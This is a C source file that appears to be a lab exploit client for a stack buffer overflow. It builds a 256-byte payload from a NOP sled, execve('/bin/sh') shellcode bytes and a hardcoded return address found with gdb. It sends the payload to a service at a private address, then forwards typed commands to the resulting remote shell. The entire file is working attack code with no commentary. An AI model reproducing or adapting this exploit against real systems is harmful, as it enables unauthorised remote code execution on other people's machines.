#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <pthread.h>


int debug = 1;
int sockfd;

int build_msg(u_int8_t *buf);
void *send_package();

int main(int argc, char* argv[]) {

	u_int8_t buf_non_pointer[256];
	u_int8_t *buf = buf_non_pointer;
	build_msg(buf); //Modify the buffer


	//Our socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (debug) printf("Socket created\n");

	//Configure the destination
	char dest_ip_adress[] = "192.168.56.103";
	struct sockaddr_in dest;
	memset(&dest,0,sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_port = htons(4321);
	inet_pton(AF_INET, dest_ip_adress, &(dest.sin_addr));

	//Connect to dest
	connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in));
	if (debug) printf("Socket connected to destination\n");

	//Wait to receive the question
	char recveive_buf[500];
	memset(recveive_buf, 0, 500);
	int receive_length = recv(sockfd, recveive_buf, 500, 0); //receive in bytes
	if (debug) {
		printf("Message received : %s\n", recveive_buf);
	};
	if (receive_length == -1) printf("ERROR : RECEIVE");

	//Send the anwser with the command
	send(sockfd, buf_non_pointer, 256, 0);
	if (debug) printf("Message sent\n");


	pthread_t send_threads;
	if ( pthread_create(&send_threads, NULL, send_package, NULL) != 0 ) {
		printf("ERROR : CREATION THREADS");
	};

	while (1) {
		//Wait to receive the question
		memset(recveive_buf, 0, 500);
		int receive_length = recv(sockfd, recveive_buf, 500, 0); //receive in bytes
		if (debug) {
			printf("Message received : %s\n", recveive_buf);
		};
		if (receive_length == -1) printf("ERROR : RECEIVE");
	};

	pthread_join(send_threads, NULL);

	return 0;

};


int build_msg(u_int8_t *buf) {

	memset(buf, 0x90, 256); //Fill all with the no-op instruction

	//u_int8_t shell_code[23] = { 0x31 , 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80};
	u_int8_t shell_code[30] = { 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05};
	int shell_code_size = 30;
	long ret_addr = 0x7fffffffe5f0; //buf address given by the program
	int ret_addr_pos = 127; //The position in the buffer of the new return address --> Value found with gdb research

	memcpy(buf, shell_code, shell_code_size ); //Copy the shellcode at the beginning of buf
	memcpy(buf + 140, &ret_addr , 6);
	*(buf + 146) = 0x00;

	return 0;
};


void *send_package() {
	char commands[200];
	while (1) {
		memset(commands, 0, 200);
		fgets(commands, 200, stdin);
		send(sockfd, commands, 256, 0);
	};

};
